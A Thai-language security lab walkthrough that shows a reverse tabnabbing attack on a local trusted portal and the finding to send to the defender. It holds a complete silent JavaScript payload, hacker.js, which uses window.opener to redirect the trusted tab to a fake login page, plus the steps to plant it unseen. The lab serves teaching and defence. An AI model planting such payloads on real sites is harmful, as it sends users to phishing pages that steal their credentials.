# Part 1 — Hacker Playbook

บทนี้เริ่มจาก External Partner Site ที่เป็นเว็บปกติ จากนั้นจำลองว่า Hacker ได้รับอนุญาตให้ควบคุม Source และเพิ่ม JavaScript Payload แบบทำงานเบื้องหลัง หน้า Partner จะไม่แสดง Hacker Console, สถานะการโจมตี หรือ Countdown ให้ผู้ใช้เห็น

> [!WARNING]
> แก้ไขและทดสอบเฉพาะไฟล์ใน `demo/external-site` ของ Lab นี้ ใช้ Credential สมมติ และห้ามนำ Payload ไปใช้กับระบบที่ไม่ได้รับอนุญาต

## Objective

1. ตรวจ Partner Site ก่อนแก้ไข
2. เพิ่ม `hacker.js` แบบไม่มี Visual Indicator
3. Rebuild External Site Container
4. ตรวจ Preconditions ผ่าน DevTools
5. สาธิต Reverse Tabnabbing และเก็บหลักฐานให้ Defender

## Scope และ Architecture

| ระบบ | URL | Source ที่เกี่ยวข้อง |
| --- | --- | --- |
| Trusted Site | <http://localhost:8100> | `demo/trusted-site/portal.html` |
| External Site | <http://localhost:9100> | `demo/external-site/index.html` และ `hacker.js` ที่จะสร้าง |

ตรวจสอบสถานะก่อนเริ่ม:

```bash
podman compose ps
```

## Preconditions

- Trusted Site เปิด External Site ด้วย `target="_blank"` และ `rel="opener"`
- Hacker ได้รับอนุญาตให้แก้ Source และ rebuild External Site ใน Lab
- ผู้ใช้เปิด External Site ผ่านลิงก์จาก Trusted Site
- Browser อนุญาตให้หน้าใหม่ได้รับ `window.opener` ตามที่ Lab กำหนด

เพียงพบ External Link ยังไม่ถือว่าโจมตีได้ Hacker ต้องควบคุมหรือสามารถรัน JavaScript ที่ปลายทางก่อน

## 1. เก็บ Baseline ก่อนแก้ Code

1. เปิด <http://localhost:9100> โดยตรง
2. ยืนยันว่าเห็นหน้า Orbit Security Labs ตามปกติ
3. ยืนยันว่าไม่มี Redirect หรือพฤติกรรมผิดปกติ
4. เปิด DevTools Console แล้วตรวจ:

```js
Boolean(window.opener)
```

เมื่อเปิด URL โดยตรง ผลควรเป็น `false` เพราะไม่มีหน้าอื่นเปิดแท็บนี้ขึ้นมา

## 2. โหลด Payload โดยไม่เพิ่ม Visual Indicator

เปิด `demo/external-site/index.html` แล้วเพิ่มเพียง Script loader ก่อนปิด `</body>`:

```html
<script src="/hacker.js" defer></script>
```

บรรทัดนี้ไม่เพิ่มข้อความ, Panel, Badge หรือสถานะใดบนหน้า Partner ผู้ใช้จึงยังเห็นบทความหน้าตาเดิม

## 3. สร้าง Silent Payload

สร้างไฟล์ `demo/external-site/hacker.js`:

```js
(() => {
  const trustedTab = window.opener;

  if (!trustedTab || trustedTab.closed) {
    return;
  }

  const phishingUrl = new URL(
    "/session-expired.html",
    window.location.href
  );

  window.setTimeout(() => {
    if (!trustedTab.closed) {
      trustedTab.location.href = phishingUrl.href;
    }
  }, 5000);
})();
```

Payload นี้ตั้งใจไม่มี:

- การแก้ DOM หรือเพิ่ม HTML ที่ผู้ใช้มองเห็น
- Hacker Console, `alert()` หรือข้อความใน Console
- Network request สำหรับส่งข้อมูลออก
- Cookie, Local Storage หรือ Session Storage

ถ้าไม่พบ `window.opener` Script จะจบการทำงานเงียบ ๆ หากพบจะรอ 5 วินาทีแล้วเปลี่ยน URL ของ Trusted Tab

## 4. Rebuild External Site

ไฟล์ถูก `COPY` เข้า Image ตอน Build จึงต้อง rebuild External Site:

```bash
podman compose up -d --build --force-recreate external-site
podman compose ps
```

## 5. Negative Test

1. เปิด <http://localhost:9100> โดยพิมพ์ URL โดยตรง
2. ตรวจว่า Partner Site ยังมีหน้าตาเหมือนเดิม
3. รอเกิน 5 วินาทีและยืนยันว่าไม่มี Redirect
4. ตรวจใน DevTools Console:

```js
Boolean(window.opener)
```

ผลต้องเป็น `false` การไม่มีป้าย `BLOCKED` เป็นสิ่งที่ตั้งใจไว้ เพราะ Payload ทำงานแบบเงียบ

## 6. เก็บ Baseline ของ Trusted Login

1. เปิด <http://localhost:8100>
2. ยืนยันว่า Address Bar แสดง Port `8100`
3. สังเกตหน้า Login จริงของ KOPE CloudOps
4. ใช้ข้อมูลสมมติเข้าสู่ Portal
5. ยืนยันว่า URL เป็น `/portal.html` บน Port `8100`

## 7. ตรวจ Vulnerable Link

ในหน้า Portal ตรวจลิงก์ **อ่านบทความจาก Partner**:

```html
<a href="http://localhost:9100/"
   target="_blank"
   rel="opener">
```

`rel="opener"` จงใจคง Reference กลับมายัง Trusted Tab สำหรับ Lab

## 8. Execute Attack ใน Lab

1. กด **อ่านบทความจาก Partner** จากหน้า Portal
2. ยืนยันว่าแท็บใหม่อยู่ที่ Port `9100`
3. สังเกตว่า Partner Site ยังแสดงบทความปกติ ไม่มีสัญญาณว่ามี Payload
4. เปิด DevTools Console ของ External Site แล้วตรวจ:

```js
Boolean(window.opener)
```

ผลที่คาดหวังก่อน Defender แก้ไข:

```text
true
```

5. รอเกิน 5 วินาที
6. กลับไปยัง Trusted Tab เดิม
7. ยืนยันว่า URL เปลี่ยนจาก Port `8100` เป็น `9100/session-expired.html`
8. เปรียบเทียบหน้า Login ปลอมกับหน้า Login จริง

## 9. อธิบายผลกระทบอย่างถูกต้อง

Hacker ไม่สามารถอ่าน DOM, Cookie หรือ JavaScript state ของ Trusted Site เพราะทั้งสองเว็บไซต์เป็นคนละ Origin แต่ Browser ยังอนุญาตให้ External Site สั่ง Navigation ของ `window.opener` ไปยัง URL ใหม่ได้ในเงื่อนไขของ Lab

Finding นี้พิสูจน์การเปลี่ยน Trusted Tab ไปยังหน้า Phishing ไม่ใช่การอ่านข้อมูลภายใน Trusted Site โดยตรง

### จุดสังเกต Login จริงกับ Login ปลอม

| สัญญาณ | Login จริง | Login ปลอม |
| --- | --- | --- |
| Origin | `localhost:8100` | `localhost:9100` |
| จังหวะ | ผู้ใช้เปิดหน้า Login เอง | ปรากฏขึ้นหลังเปิดเว็บ Partner |
| ข้อความ | เข้าสู่ระบบตามปกติ | อ้างว่า Session หมดอายุและเร่งให้กรอกซ้ำ |
| รูปลักษณ์ | UI ของระบบจริง | เลียนแบบสี โลโก้ และ Layout ได้ |

## Evidence checklist

- [ ] Partner Site ก่อนและหลังเพิ่ม Script มีหน้าตาเหมือนเดิม
- [ ] Diff ที่แสดง Script loader และไฟล์ `hacker.js`
- [ ] ผล rebuild ของ External Site
- [ ] Negative Test: เปิดโดยตรงแล้ว `Boolean(window.opener) === false`
- [ ] Source ของลิงก์ที่มี `target="_blank"` และ `rel="opener"`
- [ ] Attack Test: เปิดผ่าน Portal แล้ว `Boolean(window.opener) === true`
- [ ] URL ของ Trusted Tab ก่อนและหลัง Payload ทำงาน
- [ ] ภาพเปรียบเทียบ Login จริงกับ Login ปลอม
- [ ] Browser และ Version ที่ใช้ทดสอบ

## Finding สำหรับส่งให้ Defender

```markdown
### Reverse Tabnabbing via external partner link

#### Preconditions
Attacker must be able to execute JavaScript on the external partner origin,
and the user must open that origin through the vulnerable link.

#### Root cause
Trusted Site explicitly preserves window.opener with rel="opener".

#### Impact
External Site can silently replace the trusted tab with a phishing page that
imitates the legitimate login experience.

#### Evidence
- Boolean(window.opener) returned true when opened through the Portal.
- Trusted Tab changed from localhost:8100 to localhost:9100.
- The original link contained target="_blank" and rel="opener".

#### Recommendation
Use rel="noopener noreferrer", rebuild the Trusted Site image, and retest
with the same silent payload.
```

## ส่งมอบให้ Defender

คง External Site ที่เพิ่ม `hacker.js` ไว้เป็น Regression Test ห้ามลบ Payload หรือเพิ่มเงื่อนไขเพื่อทำให้ Retest ผ่าน จากนั้นให้ Defender ใช้ [DEFENDER.md](./DEFENDER.md) แก้เฉพาะ Trusted Site
